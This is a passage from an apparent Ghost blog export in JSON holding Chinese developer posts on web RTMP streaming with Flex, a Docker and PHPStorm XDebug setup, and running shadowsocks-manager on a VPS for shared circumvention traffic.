Flex\nFlex是Adobe官方提供的一款ActionScript开发框架，Flex提供了丰富的API，并能将ActionScript编译成可被Flash\nPlayer执行的swf文件。在开始工作之前，我们需要在开发环境中下载并安装Flex SDK\n[https://www.adobe.com/devnet/flex/flex-sdk-download.html]。\n\n通过ActionScript我们可以实现通过摄像头和麦克风捕捉画面和声音并将媒体数据通过网络流推送至RTMP服务器的工作：\n\n  cam = Camera.getCamera();\n  ns = new NetStream(nc);\n  ns.attachCamera(cam);\n  ns.publish(name, \"live\");\n\n\n更多细节可以参考这个简单的例子\n[https://github.com/chxj1992/rtmp-streamer/blob/master/RtmpStreamer.as]。\n\n借助Flex SDK中的 mxmlc,\nActionScript最终会被编译成swf文件并嵌入我们的网页中，我们只要通过javascript调用swf文件暴露出的接口，就能实现对推流过程的操作。\n\n这里，提供一个现成的 Web端实现RTMP推流的Javascript库 [https://github.com/chxj1992/rtmp-streamer]\n（可以通过bower或npm获得），该库遵循AMD规范，开发者可以通过Requirejs [http://www.requirejs.org/]\n之类的AMD加载器引入自己的项目中。其原理正是上面所提到的，通过调用swf暴露出的接口，来实现对RTMP数据流的控制。这个库提供了一些基础的API，比如设置视频采集的帧率、摄像头品质、麦克风品质等，如果没有特殊的需求，只需要引入项目中编译好的swf文件及\n rtmp-streamer.min.js\n，通过javascript提供的API就能实现基本的推流功能了。如果需要更多复杂的特性，也可以通过修改ActionScript的代码来实现，Flex提供了丰富的接口帮助你实现对摄像头及数据流的操作。更详细使用说明，请参见\n\n项目文档 [https://github.com/chxj1992/rtmp-streamer]。\n\n这里提供一个简单的例子:\n在html文件中, 需要引入 RtmpStreamer.swf  文件:\n\n<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"zh_cn\" lang=\"zh_cn\">\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"/>\n    <title>rtmp streamer example</title>\n    <script data-main=\"main\" src=\"require.js\"></script>\n</head>\n<body style=\"text-align: center;\">\n\nrtmp address:\n<input id=\"url\" type=\"text\" style=\"width: 400px;\" value=\"rtmp://localhost:1935/live\" title=\"url\">\n<input id=\"stream-name\" type=\"text\" style=\"width: 150px;\" value=\"myStream\" title=\"stream-name\">\n\n<h2>Streamer</h2>\n<object>\n    <embed id=\"rtmp-streamer\" src=\"../RtmpStreamer.swf\" bgcolor=\"#999999\" quality=\"high\"\n           width=\"320\" height=\"240\" allowScriptAccess=\"sameDomain\" type=\"application/x-shockwave-flash\"></embed>\n</object>\n<br>\n<button id=\"publish\"> push</button>\n<button id=\"streamer-disconnect\"> disconnect</button>\n\n<hr>\n\n<h2>Player</h2>\n<object>\n    <embed id=\"rtmp-player\" src=\"../RtmpStreamer.swf\" bgcolor=\"#999999\" quality=\"high\"\n           width=\"320\" height=\"240\" allowScriptAccess=\"sameDomain\" type=\"application/x-shockwave-flash\"></embed>\n</object>\n<br>\n<button id=\"play\"> play</button>\n<button id=\"player-disconnect\"> disconnect</button>\n\n</body>\n\n<script lang=\"javascript\">\n\n</script>\n\n</html>\n\n\n在js文件里, 我用 RequireJs  将rtmp-streamer包加载进来:\n\nrequire.config({\n    paths: {\n        \"rtmp-streamer\": \"../rtmp-streamer.min\"\n    }\n});\n\nrequire([\"rtmp-streamer\"], function (RtmpStreamer) {\n\n    var getUrl = function () {\n        return document.getElementById('url').value;\n    };\n\n    var getName = function () {\n        return document.getElementById('stream-name').value;\n    };\n\n    var streamer = new RtmpStreamer(document.getElementById('rtmp-streamer'));\n    var player = new RtmpStreamer(document.getElementById('rtmp-player'));\n\n    document.getElementById(\"play\").addEventListener(\"click\", function () {\n        player.play(getUrl(), getName());\n    });\n\n    document.getElementById(\"publish\").addEventListener(\"click\", function () {\n        streamer.publish(getUrl(), getName());\n    });\n\n    document.getElementById(\"streamer-disconnect\").addEventListener(\"click\", function () {\n        streamer.disconnect();\n    });\n\n    document.getElementById(\"player-disconnect\").addEventListener(\"click\", function () {\n        player.disconnect();\n    });\n\n});\n\n\n运行效果如下:\n\n\n\nRTMP服务器\nRTMP作为一种比较成熟的技术，市面上的服务端项目不论是开源的还是商业软件都有不少的选择，这里推荐一个叫Wowza\n[https://www.wowza.com/free-trial]的RTMP服务器，如果作为个人学习使用，下载一个免费试用版来玩一玩还是挺不错的。\n\n\n采用直播云服务\n直播业务对服务器的负载和网络延迟都有较高的要求, 如果不是很大规模的项目, 一般直接采用靠谱的直播云服务的比较划算, 这里我们以七牛云\n[https://www.qiniu.com/products/pili]为例:\n\n设置参数的方式和用OBS等工具推流时的方式类似, 地址为直播云的空间名, 数据流名称为直播流的名称加鉴权参数:\n\n\n\n在七牛的直播云管理后台中预览推流视频:","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-05-27 05:40:18","updated_at":"2017-03-12 07:37:26","published_at":"2016-06-09 14:49:11","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e79","uuid":"f0f4c06e-a0ad-4918-8bc0-56e834a5905f","title":"Docker + PHPStorm 搭建虚拟化开发环境","slug":"setting-up-vitual-develop-environment-by-docker","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 从 `PHPStorm 2016.3` 版本起, `PHPStorm` 对 `Docker` 提供了更友好的支持. 在之前的版本中, 想在 `PHPStorm` 中使用 `Docker` 容器内的 `PHP` 解释器(`interpreter`)来调试代码是比较麻烦的, 我们需要在 `Docker` 容器内安装并启动 `sshd` 服务(由于一个 `Docker` 只能服务单个进程, 还需要借助 `supervisord` 等进程管理工具来实现), 再配置 `PHPStorm` 通过 `ssh` 的方式访问容器内的 `PHP` 解释器. 不过现在, `Docker` 已成为了 `PHPStorm` 的一等公民. 那么是时候和 `Vagrant` 说再见, 投入 `Docker` 的怀抱啦. 当然, 如果你还是更喜欢 `Vagrant`, 可以参考我的前一篇博客, [Vagrant + PHPStorm 搭建虚拟化开发环境的实践方案](http://blog.chxj.name/setting-up-vitual-develop-environment-by-vagrant/)\\n\\n##### 容器\\n\\n`Dockerfile` 配置, 容器基于Docker官方的 `PHP` 镜像, 并开启了 `xdebug` 扩展.\\n```\\nFROM php:7.1-fpm\\nRUN pecl install xdebug\\nRUN docker-php-ext-enable xdebug\\n\\nADD php.ini /usr/local/etc/php/php.ini \\n```\\n\\n然后,通过 `socat` 工具 (Mac下可通过 `brew install socat` 安装) 将 `Docker` 数据接口转换为一个 `Tcp` 网络接口暴露给 `PHPStorm` (从 `PHPStorm` 2017.1 起，API URL可直接填写 `unix：///var/run/docker.sock`, 而无需再借助 `socat` 做转发) , 具体命令如下:\\n```bash\\n$ socat TCP-LISTEN:2375,reuseaddr,fork,bind=localhost UNIX-CONNECT:/var/run/docker.sock\\n```\\n\\n设置 `Docker` 配置, 在 `API URL` 一栏中填写经 `socat` 提供的 `Tcp` 接口\\n\\n![](/content/images/2017/03/docker-server.png)\\n\\n##### Remote Interpreter\\n\\n在 `Language&Frameworks` 中找到 `PHP` 相关配置\\n\\n![](/content/images/2017/03/php.png)\\n\\n修改 `Interpreter` 配置, 添加远程解释器(`Remote Interpreter`) 并选用 `Docker` 模式, 选择 `Server` 及对应的 `Image`\\n\\n![](/content/images/2017/03/interpreter.png)\\n\\n\\n需要注意的是, 当使用 `docker-compose`（version：2） 工具启动容器时, 默认的 `Docker` 网络名称为 `目录名_default`, 具体可用 `docker network ls` 命令进行查看. 所以,当使用 `docker-compose` 时, 还需修改 `Docker Container` 配置, 将 `Network mode` 设为对应值.\\n\\n![](/content/images/2017/03/docker-network.png)\\n\\n运行单元测试, 可以看到, `PHPStorm` 已通过调用 Docker 容器中的 `远程PHP解释器` 来执行该测试代码了.\\n\\n![](/content/images/2017/03/phpunit.png)\\n\\n##### XDebug\\n\\n在 `php.ini` 中加入 `XDebug` 相关配置:\\n\\n```\\n[xdebug]\\nxdebug.remote_enable=1\\nxdebug.remote_port=5902\\nxdebug.remote_host=docker_host\\n```\\n\\n在 `docker-compose.yml` 文件中 `extra_hosts` 配置, 此处, `192.168.1.6` 为宿主机的内网IP (`ifconfig en0`), `extra_hosts` 相当于向容器的 `/etc/hosts加入` 中加入 `docker_host 192.168.1.6` 映射关系. 这样, 当带有调试标志的请求到达容器内解释器中时, `XDebug` 会通过配置的 `remote_port` 和 `remote_host` 通知宿主机IDE(PHPStorm), 进入调试状态. 需要注意的是, 在网络环境发生变化时, 宿主机的内网IP可能发生改变, 这个时候需要改变 `docker-compose.yml` 文件中的 `extra_hosts` 配置的IP地址, 并执行 `docker-compose up -d` 重新创建容器.\\n\\n```\\nversion: '2'\\nservices:\\n  web:\\n    build: ./web\\n    container_name: med-news-web\\n    extra_hosts:\\n      docker_host: 192.168.1.6\\n```\\n\\n在 `PHPStorm` 中设置 `XDebug` 端口及 `Server` 配置\\n\\n![](/content/images/2017/03/xdebug.png)\\n\\n需要注意设置项目在宿主主机的目录与在容器中目录的映射关系\\n\\n![](/content/images/2017/03/xdebug-server.png)\\n\\n开启监听状态\\n\\n![](/content/images/2017/03/xdebug-listen-1.png)\\n\\n在 `Chrome` 浏览器中安装 [`XDebug Helper` 插件](https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc)\\n\\n![](/content/images/2017/03/chrome-xdebug.png)\\n\\n在 `PHPStorm` 中设置断点, 将 `XDebug Helper` 切换到 `Debug` 状态, 并刷新页面, 如下图, 程序已经进入调试状态了\\n\\n![](/content/images/2017/03/xdebug-pause.png)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>从 <code>PHPStorm 2016.3</code> 版本起, <code>PHPStorm</code> 对 <code>Docker</code> 提供了更友好的支持. 在之前的版本中, 想在 <code>PHPStorm</code> 中使用 <code>Docker</code> 容器内的 <code>PHP</code> 解释器(<code>interpreter</code>)来调试代码是比较麻烦的, 我们需要在 <code>Docker</code> 容器内安装并启动 <code>sshd</code> 服务(由于一个 <code>Docker</code> 只能服务单个进程, 还需要借助 <code>supervisord</code> 等进程管理工具来实现), 再配置 <code>PHPStorm</code> 通过 <code>ssh</code> 的方式访问容器内的 <code>PHP</code> 解释器. 不过现在, <code>Docker</code> 已成为了 <code>PHPStorm</code> 的一等公民. 那么是时候和 <code>Vagrant</code> 说再见, 投入 <code>Docker</code> 的怀抱啦. 当然, 如果你还是更喜欢 <code>Vagrant</code>, 可以参考我的前一篇博客, <a href=\"http://blog.chxj.name/setting-up-vitual-develop-environment-by-vagrant/\">Vagrant + PHPStorm 搭建虚拟化开发环境的实践方案</a></p>\n</blockquote>\n<h5 id=\"\">容器</h5>\n<p><code>Dockerfile</code> 配置, 容器基于Docker官方的 <code>PHP</code> 镜像, 并开启了 <code>xdebug</code> 扩展.</p>\n<pre><code>FROM php:7.1-fpm\nRUN pecl install xdebug\nRUN docker-php-ext-enable xdebug\n\nADD php.ini /usr/local/etc/php/php.ini \n</code></pre>\n<p>然后,通过 <code>socat</code> 工具 (Mac下可通过 <code>brew install socat</code> 安装) 将 <code>Docker</code> 数据接口转换为一个 <code>Tcp</code> 网络接口暴露给 <code>PHPStorm</code> (从 <code>PHPStorm</code> 2017.1 起，API URL可直接填写 <code>unix：///var/run/docker.sock</code>, 而无需再借助 <code>socat</code> 做转发) , 具体命令如下:</p>\n<pre><code class=\"language-bash\">$ socat TCP-LISTEN:2375,reuseaddr,fork,bind=localhost UNIX-CONNECT:/var/run/docker.sock\n</code></pre>\n<p>设置 <code>Docker</code> 配置, 在 <code>API URL</code> 一栏中填写经 <code>socat</code> 提供的 <code>Tcp</code> 接口</p>\n<p><img src=\"/content/images/2017/03/docker-server.png\" alt=\"\"></p>\n<h5 id=\"remoteinterpreter\">Remote Interpreter</h5>\n<p>在 <code>Language&amp;Frameworks</code> 中找到 <code>PHP</code> 相关配置</p>\n<p><img src=\"/content/images/2017/03/php.png\" alt=\"\"></p>\n<p>修改 <code>Interpreter</code> 配置, 添加远程解释器(<code>Remote Interpreter</code>) 并选用 <code>Docker</code> 模式, 选择 <code>Server</code> 及对应的 <code>Image</code></p>\n<p><img src=\"/content/images/2017/03/interpreter.png\" alt=\"\"></p>\n<p>需要注意的是, 当使用 <code>docker-compose</code>（version：2） 工具启动容器时, 默认的 <code>Docker</code> 网络名称为 <code>目录名_default</code>, 具体可用 <code>docker network ls</code> 命令进行查看. 所以,当使用 <code>docker-compose</code> 时, 还需修改 <code>Docker Container</code> 配置, 将 <code>Network mode</code> 设为对应值.</p>\n<p><img src=\"/content/images/2017/03/docker-network.png\" alt=\"\"></p>\n<p>运行单元测试, 可以看到, <code>PHPStorm</code> 已通过调用 Docker 容器中的 <code>远程PHP解释器</code> 来执行该测试代码了.</p>\n<p><img src=\"/content/images/2017/03/phpunit.png\" alt=\"\"></p>\n<h5 id=\"xdebug\">XDebug</h5>\n<p>在 <code>php.ini</code> 中加入 <code>XDebug</code> 相关配置:</p>\n<pre><code>[xdebug]\nxdebug.remote_enable=1\nxdebug.remote_port=5902\nxdebug.remote_host=docker_host\n</code></pre>\n<p>在 <code>docker-compose.yml</code> 文件中 <code>extra_hosts</code> 配置, 此处, <code>192.168.1.6</code> 为宿主机的内网IP (<code>ifconfig en0</code>), <code>extra_hosts</code> 相当于向容器的 <code>/etc/hosts加入</code> 中加入 <code>docker_host 192.168.1.6</code> 映射关系. 这样, 当带有调试标志的请求到达容器内解释器中时, <code>XDebug</code> 会通过配置的 <code>remote_port</code> 和 <code>remote_host</code> 通知宿主机IDE(PHPStorm), 进入调试状态. 需要注意的是, 在网络环境发生变化时, 宿主机的内网IP可能发生改变, 这个时候需要改变 <code>docker-compose.yml</code> 文件中的 <code>extra_hosts</code> 配置的IP地址, 并执行 <code>docker-compose up -d</code> 重新创建容器.</p>\n<pre><code>version: '2'\nservices:\n  web:\n    build: ./web\n    container_name: med-news-web\n    extra_hosts:\n      docker_host: 192.168.1.6\n</code></pre>\n<p>在 <code>PHPStorm</code> 中设置 <code>XDebug</code> 端口及 <code>Server</code> 配置</p>\n<p><img src=\"/content/images/2017/03/xdebug.png\" alt=\"\"></p>\n<p>需要注意设置项目在宿主主机的目录与在容器中目录的映射关系</p>\n<p><img src=\"/content/images/2017/03/xdebug-server.png\" alt=\"\"></p>\n<p>开启监听状态</p>\n<p><img src=\"/content/images/2017/03/xdebug-listen-1.png\" alt=\"\"></p>\n<p>在 <code>Chrome</code> 浏览器中安装 <a href=\"https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc\"><code>XDebug Helper</code> 插件</a></p>\n<p><img src=\"/content/images/2017/03/chrome-xdebug.png\" alt=\"\"></p>\n<p>在 <code>PHPStorm</code> 中设置断点, 将 <code>XDebug Helper</code> 切换到 <code>Debug</code> 状态, 并刷新页面, 如下图, 程序已经进入调试状态了</p>\n<p><img src=\"/content/images/2017/03/xdebug-pause.png\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"58","plaintext":"> 从 PHPStorm 2016.3  版本起, PHPStorm  对 Docker  提供了更友好的支持. 在之前的版本中, 想在 PHPStorm  中使用\n Docker  容器内的 PHP  解释器(interpreter)来调试代码是比较麻烦的, 我们需要在 Docker  容器内安装并启动 sshd \n服务(由于一个 Docker  只能服务单个进程, 还需要借助 supervisord  等进程管理工具来实现), 再配置 PHPStorm  通过 ssh \n的方式访问容器内的 PHP  解释器. 不过现在, Docker  已成为了 PHPStorm  的一等公民. 那么是时候和 Vagrant  说再见, 投入 \nDocker  的怀抱啦. 当然, 如果你还是更喜欢 Vagrant, 可以参考我的前一篇博客, Vagrant + PHPStorm\n搭建虚拟化开发环境的实践方案\n[http://blog.chxj.name/setting-up-vitual-develop-environment-by-vagrant/]\n\n\n容器\nDockerfile  配置, 容器基于Docker官方的 PHP  镜像, 并开启了 xdebug  扩展.\n\nFROM php:7.1-fpm\nRUN pecl install xdebug\nRUN docker-php-ext-enable xdebug\n\nADD php.ini /usr/local/etc/php/php.ini \n\n\n然后,通过 socat  工具 (Mac下可通过 brew install socat  安装) 将 Docker  数据接口转换为一个 Tcp \n网络接口暴露给 PHPStorm  (从 PHPStorm  2017.1 起，API URL可直接填写 unix：///var/run/docker.sock\n, 而无需再借助 socat  做转发) , 具体命令如下:\n\n$ socat TCP-LISTEN:2375,reuseaddr,fork,bind=localhost UNIX-CONNECT:/var/run/docker.sock\n\n\n设置 Docker  配置, 在 API URL  一栏中填写经 socat  提供的 Tcp  接口\n\n\n\nRemote Interpreter\n在 Language&Frameworks  中找到 PHP  相关配置\n\n\n\n修改 Interpreter  配置, 添加远程解释器(Remote Interpreter) 并选用 Docker  模式, 选择 Server  及对应的 \nImage\n\n\n\n需要注意的是, 当使用 docker-compose（version：2） 工具启动容器时, 默认的 Docker  网络名称为 目录名_default,\n具体可用 docker network ls  命令进行查看. 所以,当使用 docker-compose  时, 还需修改 Docker Container \n配置, 将 Network mode  设为对应值.\n\n\n\n运行单元测试, 可以看到, PHPStorm  已通过调用 Docker 容器中的 远程PHP解释器  来执行该测试代码了.\n\n\n\nXDebug\n在 php.ini  中加入 XDebug  相关配置:\n\n[xdebug]\nxdebug.remote_enable=1\nxdebug.remote_port=5902\nxdebug.remote_host=docker_host\n\n\n在 docker-compose.yml  文件中 extra_hosts  配置, 此处, 192.168.1.6  为宿主机的内网IP (ifconfig\nen0), extra_hosts  相当于向容器的 /etc/hosts加入  中加入 docker_host 192.168.1.6  映射关系. 这样,\n当带有调试标志的请求到达容器内解释器中时, XDebug  会通过配置的 remote_port  和 remote_host \n通知宿主机IDE(PHPStorm), 进入调试状态. 需要注意的是, 在网络环境发生变化时, 宿主机的内网IP可能发生改变, 这个时候需要改变 \ndocker-compose.yml  文件中的 extra_hosts  配置的IP地址, 并执行 docker-compose up -d  重新创建容器.\n\nversion: '2'\nservices:\n  web:\n    build: ./web\n    container_name: med-news-web\n    extra_hosts:\n      docker_host: 192.168.1.6\n\n\n在 PHPStorm  中设置 XDebug  端口及 Server  配置\n\n\n\n需要注意设置项目在宿主主机的目录与在容器中目录的映射关系\n\n\n\n开启监听状态\n\n\n\n在 Chrome  浏览器中安装 XDebug Helper 插件\n[https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc]\n\n\n\n在 PHPStorm  中设置断点, 将 XDebug Helper  切换到 Debug  状态, 并刷新页面, 如下图, 程序已经进入调试状态了","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-10 02:54:05","updated_at":"2017-04-10 09:26:51","published_at":"2017-03-29 14:58:04","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7a","uuid":"f57b30a6-effb-4217-90d1-90e5ba95e08c","title":"Shadowsocks Manager：分享VPS的闲置流量","slug":"shadowsocks-manager","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"最近把自己服务器从阿里云迁到了[Vultr](https://www.vultr.com/), 不比不知道，差不多的配置价格便宜了差不多一半，而且还有各种新用户充值活动，的确划算。\\n\\n还有常年有效的个人邀请码，`http://www.vultr.com/?ref=7157325`，新用户下单后各奖励10$，还是很不错哦。\\n\\n我选择的是日本机房的节点，每月5$，提供1000G流量，日本距离中国也比较近，速度还是相当不错的。感觉博客打开的速度比以前用阿里云还要更快一些呢，哈哈。\\n![vultr](/content/images/2017/06/vultr.png)\\n\\n说到正题，我在之前的[一篇博客](http://blog.chxj.name/setup-a-personal-vpn-server/)里分享过一个用shadowsocks搭建翻墙服务的方法，这次的主角 [shadowsocks manager](https://github.com/shadowsocks/shadowsocks-manager) 正是一个开源的shadowsocks管理系统，通过它能实现帐号管理、流量控制、订单管理等功能。由于中国大陆目前的特殊国情，市场上存在大量提供翻墙服务的商家，其中很大一部分都采用了通过shadowsocks来实现翻墙的方式，我想这其中又有很大一部分还是基于`shadowsocks manager` 做的二次开发。\\n\\n`shadowsocks manager` 项目地址： [https://github.com/shadowsocks/shadowsocks-manager](https://github.com/shadowsocks/shadowsocks-manager)\\n\\n如果觉得觉得部署麻烦的话，当然，还可以用这个现成的 `Docker` 镜像，虽然我稍微改了一点点界面： \\n[https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/](https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/)\\n\\n具体的部署方式在项目的文档里已经有比较清楚的描述了，这里不再赘述，比较重要的一步是需要通过 `shadowsocks` 提供的 `ss-manager` 工具将 `ss-server` 的接口暴露出来以便 `shadowsocks manager` 调用，具体命令如下：\\n\\n```\\nss-manager -m aes-256-cfb -u --manager-address 127.0.0.1:6001\\n```\\n\\n还有个坑就是使用支付宝的插件需要支付宝账户[开通个人收款功能](http://cn.v2ex.com/t/326701)（如果不是商户的话），然后开通用这个收款功能的方法居然是去扫一个莫名其妙的二维码。不过现在已经扫二维码已经开不了，好像个人收款码和什么收钱码合并了。\\n\\n支付宝插件的配置写在 `webui.yml` 中\\n\\n```\\n  alipay:\\n    use: true\\n    appid: 2015012104922471\\n    notifyUrl: ''\\n    merchantPrivateKey: 'xxxxxxxxxxxx'\\n    alipayPublicKey: 'xxxxxxxxxxx'\\n    gatewayUrl: \\n   'https://openapi.alipay.com/gateway.do'\\n```\\n\\n配置参数相对复杂一点，两个key需要先在支付宝开放平台的app管理是设置，可以自己用openssl生成一对密钥然后把公钥传到开放平台。`gatewayUrl` 是固定的。\\n\\n\\n之前一直用前公司的服务器翻墙（也是用shadowsocks搭的），既然现在已经把我的服务器迁到国外了，不如索性自己搭一个shadowsocks服务。然后拿 `shadowsocks manager` 改了下UI搭了个网站。本网站提供的翻墙服务是完全免费的，只需要通过邮箱注册帐号，就可以获得每天500M的免费流量，满足学生狗和科研狗查资料的基本需求。反正每月1000G的流量我一个人也是用不完的。\\n网站地址： [http://fuck-the-wall.chxj.name](http://fuck-the-wall.chxj.name)\\n[![](/content/images/2017/06/fuck-the-wall.png)](http://fuck-the-wall.chxj.name)\\n\\n如果你喜欢这个网站，可以打开支付宝扫描网址底部的二维码(或长按图片识别图中二维码)向我打赏一元，以示鼓励! 当然，也可以不打赏。更要感谢Shadowsocks作者 [@clowwindy](https://github.com/clowwindy) 无私的开源精神以及为争取人民自由意志所做作出的杰出贡献。 网站的代码及镜像同样是开源的，所以如果你有一台墙外的VPS，你也可以直接使用[这个Docker镜像](https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/)在自己的服务器上搭建一个翻墙服务并分享给你的朋友们。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>最近把自己服务器从阿里云迁到了<a href=\"https://www.vultr.com/\">Vultr</a>, 不比不知道，差不多的配置价格便宜了差不多一半，而且还有各种新用户充值活动，的确划算。</p>\n<p>还有常年有效的个人邀请码，<code>http://www.vultr.com/?ref=7157325</code>，新用户下单后各奖励10$，还是很不错哦。</p>\n<p>我选择的是日本机房的节点，每月5$，提供1000G流量，日本距离中国也比较近，速度还是相当不错的。感觉博客打开的速度比以前用阿里云还要更快一些呢，哈哈。<br>\n<img src=\"/content/images/2017/06/vultr.png\" alt=\"vultr\"></p>\n<p>说到正题，我在之前的<a href=\"http://blog.chxj.name/setup-a-personal-vpn-server/\">一篇博客</a>里分享过一个用shadowsocks搭建翻墙服务的方法，这次的主角 <a href=\"https://github.com/shadowsocks/shadowsocks-manager\">shadowsocks manager</a> 正是一个开源的shadowsocks管理系统，通过它能实现帐号管理、流量控制、订单管理等功能。由于中国大陆目前的特殊国情，市场上存在大量提供翻墙服务的商家，其中很大一部分都采用了通过shadowsocks来实现翻墙的方式，我想这其中又有很大一部分还是基于<code>shadowsocks manager</code> 做的二次开发。</p>\n<p><code>shadowsocks manager</code> 项目地址： <a href=\"https://github.com/shadowsocks/shadowsocks-manager\">https://github.com/shadowsocks/shadowsocks-manager</a></p>\n<p>如果觉得觉得部署麻烦的话，当然，还可以用这个现成的 <code>Docker</code> 镜像，虽然我稍微改了一点点界面：<br>\n<a href=\"https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/\">https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/</a></p>\n<p>具体的部署方式在项目的文档里已经有比较清楚的描述了，这里不再赘述，比较重要的一步是需要通过 <code>shadowsocks</code> 提供的 <code>ss-manager</code> 工具将 <code>ss-server</code> 的接口暴露出来以便 <code>shadowsocks manager</code> 调用，具体命令如下：</p>\n<pre><code>ss-manager -m aes-256-cfb -u --manager-address 127.0.0.1:6001\n</code></pre>\n<p>还有个坑就是使用支付宝的插件需要支付宝账户<a href=\"http://cn.v2ex.com/t/326701\">开通个人收款功能</a>（如果不是商户的话），然后开通用这个收款功能的方法居然是去扫一个莫名其妙的二维码。不过现在已经扫二维码已经开不了，好像个人收款码和什么收钱码合并了。</p>\n<p>支付宝插件的配置写在 <code>webui.yml</code> 中</p>\n<pre><code>  alipay:\n    use: true\n    appid: 2015012104922471\n    notifyUrl: ''\n    merchantPrivateKey: 'xxxxxxxxxxxx'\n    alipayPublicKey: 'xxxxxxxxxxx'\n    gatewayUrl: \n   'https://openapi.alipay.com/gateway.do'\n</code></pre>\n<p>配置参数相对复杂一点，两个key需要先在支付宝开放平台的app管理是设置，可以自己用openssl生成一对密钥然后把公钥传到开放平台。<code>gatewayUrl</code> 是固定的。</p>\n<p>之前一直用前公司的服务器翻墙（也是用shadowsocks搭的），既然现在已经把我的服务器迁到国外了，不如索性自己搭一个shadowsocks服务。然后拿 <code>shadowsocks manager</code> 改了下UI搭了个网站。本网站提供的翻墙服务是完全免费的，只需要通过邮箱注册帐号，就可以获得每天500M的免费流量，满足学生狗和科研狗查资料的基本需求。反正每月1000G的流量我一个人也是用不完的。<br>\n网站地址： <a href=\"http://fuck-the-wall.chxj.name\">http://fuck-the-wall.chxj.name</a><br>\n<a href=\"http://fuck-the-wall.chxj.name\"><img src=\"/content/images/2017/06/fuck-the-wall.png\" alt=\"\"></a></p>\n<p>如果你喜欢这个网站，可以打开支付宝扫描网址底部的二维码(或长按图片识别图中二维码)向我打赏一元，以示鼓励! 当然，也可以不打赏。更要感谢Shadowsocks作者 <a href=\"https://github.com/clowwindy\">@clowwindy</a> 无私的开源精神以及为争取人民自由意志所做作出的杰出贡献。 网站的代码及镜像同样是开源的，所以如果你有一台墙外的VPS，你也可以直接使用<a href=\"https://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/\">这个Docker镜像</a>在自己的服务器上搭建一个翻墙服务并分享给你的朋友们。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"60","plaintext":"最近把自己服务器从阿里云迁到了Vultr [https://www.vultr.com/],\n不比不知道，差不多的配置价格便宜了差不多一半，而且还有各种新用户充值活动，的确划算。\n\n还有常年有效的个人邀请码，http://www.vultr.com/?ref=7157325，新用户下单后各奖励10$，还是很不错哦。\n\n我选择的是日本机房的节点，每月5$，提供1000G流量，日本距离中国也比较近，速度还是相当不错的。感觉博客打开的速度比以前用阿里云还要更快一些呢，哈哈。\n\n\n说到正题，我在之前的一篇博客 [http://blog.chxj.name/setup-a-personal-vpn-server/]\n里分享过一个用shadowsocks搭建翻墙服务的方法，这次的主角 shadowsocks manager\n[https://github.com/shadowsocks/shadowsocks-manager] \n正是一个开源的shadowsocks管理系统，通过它能实现帐号管理、流量控制、订单管理等功能。由于中国大陆目前的特殊国情，市场上存在大量提供翻墙服务的商家，其中很大一部分都采用了通过shadowsocks来实现翻墙的方式，我想这其中又有很大一部分还是基于\nshadowsocks manager  做的二次开发。\n\nshadowsocks manager  项目地址： https://github.com/shadowsocks/shadowsocks-manager\n\n如果觉得觉得部署麻烦的话，当然，还可以用这个现成的 Docker  镜像，虽然我稍微改了一点点界面：\nhttps://hub.docker.com/r/chxj1992/shadowsocks-manager-docker/\n\n具体的部署方式在项目的文档里已经有比较清楚的描述了，这里不再赘述，比较重要的一步是需要通过 shadowsocks  提供的 ss-manager  工具将 \nss-server  的接口暴露出来以便 shadowsocks manager  调用，具体命令如下：\n\nss-manager -m aes-256-cfb -u --manager-address 127.0.0.1:6001\n\n\n还有个坑就是使用支付宝的插件需要支付宝账户开通个人收款功能 [http://cn.v2ex.com/t/326701]\n（如果不是商户的话），然后开通用这个收款功能的方法居然是去扫一个莫名其妙的二维码。不过现在已经扫二维码已经开不了，好像个人收款码和什么收钱码合并了。\n\n支付宝插件的配置写在 webui.yml  中\n\n  alipay:\n    use: true\n    appid: 2015012104922471\n    notifyUrl: ''\n    merchantPrivateKey: 'xxxxxxxxxxxx'\n    alipayPublicKey: 'xxxxxxxxxxx'\n    gatewayUrl: \n   'https://openapi.alipay.com/gateway.do'\n\n\n配置参数相对复杂一点，两个key需要先在支付宝开放平台的app管理是设置，可以自己用openssl生成一对密钥然后把公钥传到开放平台。gatewayUrl \n是固定的。\n\n之前一直用前公司的服务器翻墙（也是用shadowsocks搭的），既然现在已经把我的服务器迁到国外了，不如索性自己搭一个shadowsocks服务。然后拿 \nshadowsocks manager 